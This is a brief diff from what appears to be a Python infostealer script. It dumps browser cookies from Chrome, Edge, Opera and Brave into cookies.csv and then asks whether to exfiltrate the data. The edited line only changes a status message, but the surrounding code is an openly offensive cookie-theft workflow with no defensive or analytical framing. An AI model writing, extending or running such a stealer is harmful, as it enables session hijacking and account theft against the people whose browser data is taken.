@@ -90,7 +90,7 @@ dump_cookies(CHROME_PATH_LOCAL_STATE,CHROME_PATH,"chrome.exe","Chrome")
 dump_cookies(EDGE_PATH_LOCAL_STATE,EDGE_PATH,"msedge.exe", "Edge")
 dump_cookies(OPERA_PATH_LOCAL_STATE,OPERA_PATH,"opera.exe","Opera")
 dump_cookies(BRAVE_PATH_LOCAL_STATE,BRAVE_PATH,"brave.exe","Brave")
-print('\n')
+print("[+] Written data to cookies.csv\n")
 data.close()
 
 exfil = input("[?] Do you want to exfiltrate data: Y/N? ")
